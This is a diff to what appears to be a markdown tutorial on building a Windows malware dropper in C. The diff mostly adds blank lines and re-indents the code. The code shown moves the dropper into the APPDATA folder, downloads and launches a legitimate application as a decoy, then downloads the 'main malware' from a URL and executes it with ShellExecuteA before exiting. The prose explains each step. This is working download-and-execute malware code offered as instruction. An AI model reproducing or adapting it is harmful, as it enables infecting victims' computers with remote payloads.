@@ -19,7 +19,9 @@ Now, let's defining some variables we will be using when downloading & grabbing 
 
 `
 TCHAR current_dir[MAX_PATH]
+
 TCHAR current_file[MAX_PATH]
+
 TCHAR new_dir[MAX_PATH]
 `
 * current_dir will be used to grab the current directory & append the legitimate_app string to the end of it to build the location to drop the legitimate piece of software.
@@ -28,11 +30,15 @@ TCHAR new_dir[MAX_PATH]
 
 `
 GetCurrentDirectory(MAX_PATH, current_dir);
+
 strcat_s(current_dir, strlen(current_dir)+strlen(legitimate_app)+1, legitimate_app);
 
 GetModuleFileNameA(NULL, current_file, MAX_PATH);
+
 GetEnvironmentVariable("APPDATA", new_dir, MAX_PATH);
+
 strcat_s(new_dir, strlen(new_dir)+strlen(dropper_new_name)+1,dropper_new_name);
+
 int mresult = MoveFileA(current_file, new_dir);
 `
 
@@ -45,11 +51,17 @@ int mresult = MoveFileA(current_file, new_dir);
 
 `
 HRESULT filedl = URLDownloadToFile(NULL, legitimate_app_URL, current_dir, 0, NULL);
+
 if (filedl == S_OK) {
-    HINSTANCE result = ShellExecuteA(NULL, "open", current_dir, NULL, NULL, 0);
+
+	HINSTANCE result = ShellExecuteA(NULL, "open", current_dir, NULL, NULL, 0);
+
 }
+
 else {
-		printf("[!] Error with download\n");
+	
+	printf("[!] Error with download\n");
+
 }
 `
 
@@ -63,6 +75,7 @@ which will be used to store the full directory of the malware being dropped.
 
 `
 GetEnvironmentVariable("APPDATA", maldir, MAX_PATH);
+
 strcat_s(maldir, strlen(maldir)+strlen(malware_app)+1, malware_app);
 `
 1. Grabbing environment variable of APPDATA & storing it in maldir
@@ -70,13 +83,20 @@ strcat_s(maldir, strlen(maldir)+strlen(malware_app)+1, malware_app);
 
 `
 HRESULT maldl = URLDownloadToFile(NULL, malware_URL, maldir, 0, NULL);
+
 if (maldl == S_OK) {
-    printf("[+] Successfully downloaded main malware\n");
-    HINSTANCE result2 = ShellExecuteA(NULL, "open", maldir, NULL, NULL, 0);
-    exit(0);
+
+	printf("[+] Successfully downloaded main malware\n");
+    
+    	HINSTANCE result2 = ShellExecuteA(NULL, "open", maldir, NULL, NULL, 0);
+    
+    	exit(0);
 }
+
 else {
-    printf("[!] Error downloading main malware\n");
+
+	printf("[!] Error downloading main malware\n");
+
 }
 `
 This is a repeat of earlier code, we're simply downloading the malware from the URL stored in malware_URL & saving it to the path stored in maldir. If the download succeeds, we execute it & then exit the dropper.
